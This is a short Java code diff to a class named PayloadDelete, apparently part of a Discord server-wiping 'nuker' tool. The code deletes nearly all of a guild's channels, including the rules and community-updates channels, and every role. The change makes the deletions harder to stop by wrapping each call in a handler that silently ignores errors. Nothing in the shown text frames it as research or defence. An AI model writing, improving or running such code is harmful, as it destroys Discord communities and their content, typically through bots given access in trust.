@@ -16,17 +16,20 @@ public class PayloadDelete implements Runnable {
 	public void run() {
 		guild.getChannels().forEach(key -> {
 			if (key.getName() != name)
-				key.delete().queue();
+				try { key.delete().queue(); } catch (Exception ignored) { }
 			else
 				return;
 		});
+		
+		try {
+			guild.getRulesChannel().delete().queue();
+			guild.getCommunityUpdatesChannel().delete().queue();
+		} catch (Exception ignored) { }
 
 		guild.getRoles().forEach(key -> {
 			try {
 				key.delete().queue();
-			} catch (Exception e) {
-				return;
-			}
+			} catch (Exception ignored) { }
 		});
 	}
 
